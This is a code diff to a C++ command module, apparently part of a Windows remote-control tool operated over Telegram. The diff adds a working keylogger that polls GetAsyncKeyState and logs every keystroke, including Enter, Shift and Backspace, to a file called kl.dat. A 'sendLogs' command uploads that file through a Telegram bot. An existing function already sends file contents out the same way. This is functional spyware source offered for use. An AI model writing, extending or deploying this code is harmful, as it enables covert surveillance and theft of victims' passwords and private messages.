@@ -1,4 +1,4 @@
-#include "commands.h"
+﻿#include "commands.h"
 
 #include <string>
 #include <fstream>
@@ -637,4 +637,136 @@ void cat(std::string path) {
     f.close();
 
     telegram::SendText(output);
+}
+
+/*
+    keylogger func specification:
+
+    new thread that loggs keystrokes
+
+    commands:
+        keylogger start
+        keylogger stop
+        keylogger sendLogs
+        keylogger clear
+*/
+bool toggle_keylogger = false;
+std::thread keylogger_t;
+const std::string KEYLOGGER_FILENAME = "kl.dat";
+
+void LOG(std::string input) {
+    std::fstream LogFile;
+    LogFile.open(KEYLOGGER_FILENAME, std::fstream::app);
+    LogFile << input;
+    LogFile.close();
+}
+
+
+bool SpecialKeys(int S_Key) {
+    switch (S_Key) {
+    case VK_SPACE:
+        LOG(" ");
+        return true;
+    case VK_RETURN:
+        LOG("#ENTER#\n");
+        return true;
+    case '¾':
+        LOG(".");
+        return true;
+    case VK_SHIFT:
+        LOG("#SHIFT#");
+        return true;
+    case VK_BACK:
+        LOG("#BACKSPACE#");
+        return true;
+    case VK_RBUTTON:
+        LOG("#R_CLICK#");
+        return true;
+    case VK_CAPITAL:
+        LOG("#CAPS_LOCK#");
+        return true;
+    case VK_TAB:
+        LOG("#TAB#");
+        return true;
+    case VK_UP:
+        LOG("#UP_ARROW_KEY#");
+        return true;
+    case VK_DOWN:
+        LOG("#DOWN_ARROW_KEY#");
+        return true;
+    case VK_LEFT:
+        LOG("#LEFT_ARROW_KEY#");
+        return true;
+    case VK_RIGHT:
+        LOG("#RIGHT_ARROW_KEY#");
+        return true;
+    case VK_CONTROL:
+        LOG("#CONTROL#");
+        return true;
+    case VK_MENU:
+        LOG("#ALT#");
+        return true;
+    default:
+        return false;
+    }
+}
+
+
+void keyloggerInstance() {
+    while (toggle_keylogger) {
+        Sleep(10);
+        for (int KEY = 8; KEY <= 190; KEY++)
+        {
+            if (GetAsyncKeyState(KEY) == -32767) {
+                if (SpecialKeys(KEY) == false) {
+
+                    std::fstream LogFile;
+                    LogFile.open(KEYLOGGER_FILENAME, std::fstream::app);
+                        LogFile << char(KEY);
+                        LogFile.close();
+                }
+            }
+        }
+    }
+}
+
+void keylogger(std::string command) {
+    if (command == "start") {
+        if (toggle_keylogger == true) {
+            telegram::SendText("Keylogger already running!");
+            return;
+        }
+
+        toggle_keylogger = true;
+        keylogger_t = std::thread(keyloggerInstance);
+        return;
+    }
+
+    if (command == "stop") {
+        if (toggle_keylogger == false) {
+            telegram::SendText("Keylogger weren't running, couldn't stop it");
+            return;
+        }
+
+        toggle_keylogger = false;
+        keylogger_t.join();
+        return;
+    }
+
+    if (command == "sendLogs") {
+        telegram::SendFile(KEYLOGGER_FILENAME);
+        return;
+    }
+
+    if (command == "clear") {
+        if (toggle_keylogger == true) {
+            telegram::SendText("stop keylogger first!");
+            return;
+        }
+
+        tools::remove(KEYLOGGER_FILENAME);
+        return;
+    }
+
+    telegram::SendText("Avaiable commands:\nstart\nstop\nsendLogs\nclear");
 }
